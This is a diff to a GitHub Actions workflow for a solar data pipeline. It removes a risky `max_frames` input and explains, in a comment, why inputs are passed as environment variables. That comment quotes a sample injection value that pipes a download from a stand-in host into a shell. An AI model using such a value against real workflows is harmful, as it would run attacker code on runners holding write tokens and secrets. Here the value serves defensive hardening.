@@ -28,10 +28,18 @@ on:
         description: "Build + validate but do not publish to gh-pages"
         type: boolean
         default: false
-      max_frames:
-        description: "Only the N newest slots (blank = all 19)"
-        type: string
-        default: ""
+      # There was a third input here, `max_frames` ("Only the N newest slots"),
+      # and it was a DELETE button mislabelled as a knob. `--max-frames N`
+      # truncates the slot table AND `cli.py`'s `_prune_orphan_frames` then
+      # unlinks every published `fNN.bin` at or past N. On a runner `--out
+      # dist-data` is SEEDED from the live gh-pages tree (footgun 31) and the
+      # publish rsyncs with `--delete`, so `max_frames=2` from the Actions UI
+      # would have deleted 17 of the 19 live frames and reported success --
+      # and CI cannot retrace field lines to put them back (footgun 33; the
+      # frames on gh-pages were built by hand from a GONG-reachable machine).
+      # There is no dry-run for it in the CLI either. It stays a LOCAL
+      # quick-test flag pointed at a scratch `--out`; `pipeline all --help`
+      # says so and the run prints a WARN naming the `--out` when it is set.
 
 permissions:
   contents: write
@@ -161,13 +169,15 @@ jobs:
       - name: Build data products
         # Inputs reach the shell as ENVIRONMENT VARIABLES, never spliced into
         # the script text. ${{ }} is substituted before bash parses the line,
-        # so a max_frames of `1"; curl evil.sh | sh; #` would execute on a
-        # runner that holds contents:write and GITHUB_TOKEN. Only someone with
-        # write access can dispatch this workflow, so it is not an escalation
-        # -- but it costs two lines to close and every scanner flags it.
+        # so a free-text input of `1"; curl evil.sh | sh; #` would execute on
+        # a runner that holds contents:write and GITHUB_TOKEN. Only someone
+        # with write access can dispatch this workflow, so it is not an
+        # escalation -- but it costs two lines to close and every scanner
+        # flags it. The one free-text input that made this concrete
+        # (`max_frames`) is gone; keep the pattern anyway, because the next
+        # input added here will not necessarily be a boolean.
         env:
           FORCE: ${{ inputs.force }}
-          MAX_FRAMES: ${{ inputs.max_frames }}
           # See the probe step above and docs/GONG-RELAY.md.
           SOL_GONG_PROXY_BASE: ${{ secrets.SOL_GONG_PROXY_BASE }}
           SOL_GONG_PROXY_TOKEN: ${{ secrets.SOL_GONG_PROXY_TOKEN }}
@@ -187,7 +197,6 @@ jobs:
           # ~4 min of the run since 2cbfa32 (was ~9); see timeout-minutes above.
           ARGS="all --out dist-data -v --with-texture --with-hires"
           if [ "$FORCE" = "true" ]; then ARGS="$ARGS --force"; fi
-          if [ -n "$MAX_FRAMES" ]; then ARGS="$ARGS --max-frames $MAX_FRAMES"; fi
           python -m pipeline $ARGS
 
       # PUBLISH FIRST.  `Validate` used to sit here, ahead of this step, and
